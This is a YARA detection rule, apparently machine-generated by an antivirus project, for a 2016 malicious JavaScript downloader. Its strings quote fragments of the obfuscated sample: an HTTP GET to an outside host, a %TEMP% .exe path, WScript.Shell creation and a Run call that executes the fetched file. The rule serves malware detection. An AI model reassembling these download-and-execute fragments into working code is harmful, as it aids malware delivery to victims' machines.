rule sig_20160328_307acdc2d7afc69f99206c6260031b03 {
  meta:
    description = "datamaliciousorder - file 20160328_307acdc2d7afc69f99206c6260031b03.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "68150f781380a3f9d608819aa0bd0b3f128970ba7f0fbc3fe05def7b016c8b93"

  strings:
    $s1  = "function Kaksqw() {return Nkrzyh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zjdF4ZFGc8zWTHg.exe\";};" fullword ascii
    $s2  = "Anezy[Ejaafbppd](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Cvxlaipwu](Iyzkp() * 11)} while (Anezy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Nkrzyh = function Msehdd() {return WScript[Qxnissrov](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Kffwfho(Qzuhr, Gwurtfg){return Qzuhr - Gwurtfg;};" fullword ascii
    $s6  = "function Tvuvypvy() {return ((Ajcglhdot == true) && (Ajcglhdot == Bshfxspuwx)) ? 1 : Yxuvimwot;};" fullword ascii
    $s7  = "function Xgpmkqweiw(Wuhzcg){Nkrzyh[\"Run\"](Wuhzcg, Yxuvimwot, Yxuvimwot);};" fullword ascii
    $s8  = "Bshfxspuwx = true; " fullword ascii
    $s9  = "function Wyuwanvx()" fullword ascii
    $s10 = " while (Sjbwss){" fullword ascii
    $s11 = "return Kffwfho(Yadcshwqd, Qvckepr);" fullword ascii
    $s12 = "var Zmpywfrn = new this[\"Date\"]();" fullword ascii
    $s13 = "var Skgbs = false;" fullword ascii
    $s14 = "var Ajcglhdot = false;" fullword ascii
    $s15 = "function Iyzkp(){return 22;};" fullword ascii
    $s16 = "Ajcglhdot = true; " fullword ascii
    $s17 = "var Bshfxspuwx = false;" fullword ascii
    $s18 = "function Ckdkdzffa(){return Qxnissrov;};" fullword ascii
    $s19 = "function Sixtti(Ttmjklr) {var Ofovcikrj = (1, 2, 3, 4, 5, Ttmjklr); return Ofovcikrj;};" fullword ascii
    $s20 = "function Gllpca(){return Qxlttlesd;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}